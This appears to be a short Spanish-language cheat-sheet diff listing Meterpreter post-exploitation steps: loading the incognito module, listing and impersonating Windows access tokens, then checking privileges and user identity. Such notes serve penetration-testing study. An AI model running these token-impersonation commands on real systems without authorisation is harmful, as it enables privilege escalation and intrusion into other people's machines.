@@ -1,0 +1,9 @@
+Luego de tener una consola, cargar modulo incognito:
+  load incognito
+  Luego leer los tokens:
+    list_tokens -u
+    Luego copiar uno y usarlo:
+      impersonate_token "NOMBRE COMPLETO"
+    Luego migrar a un proceso.:
+      getprivs
+      getuid
